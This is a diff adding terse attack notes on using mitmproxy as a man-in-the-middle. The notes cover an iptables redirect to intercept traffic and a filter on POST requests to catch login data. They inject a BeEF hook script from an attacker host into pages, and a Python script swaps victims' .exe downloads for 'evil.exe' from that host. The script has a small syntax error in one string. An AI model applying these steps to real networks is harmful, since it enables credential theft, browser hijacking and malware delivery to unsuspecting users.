@@ -1,0 +1,41 @@
+# download .linux.tar.gz and extract
+mitmproxy.org/downloads
+
+# start through web browser
+./mitmweb   # paste web http link to browser
+# setup browser proxy
+127.0.0.1:8080
+
+# or setup redirect
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+./mitmweb --transparent
+# back to normal
+iptables -t nat --flush
+
+# start tab filter/highlight/intercept begin with ~   # flow tab to change packets flow
+~m POST   # for login info
+~bs </body>   # find code body to inject before </body>
+# .js example beef hook  [kali own ip]
+<script src="http://10.0.2.5:3000/hook.js"></script>
+
+
+
+# start through script
+# replace rule   :[filter]:"[code be replaced]":"[code replaced with]"
+./mitmdump --transparent --replace :~bs:"</body>":"<script src="http://10.0.2.5:3000/hook.js"></script></body>"
+./mitmdump -s [.py]
+
+
+### .py script
+import mitmproxy
+
+def request(flow):
+    print(flow.request.pretty_url)      # the url part of the request part of the packet
+    if flow.request.pretty_url.endswith(".exe") and flow.request.host != "10.0.2.5":      # if url ends with .exe
+        flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.0.2.5/evil.exe})      # mitmproxy.http.HTTPResponse.make([http code], [content], [header])
+        
+    
+def response(flow):
+    pass
+
+### end script
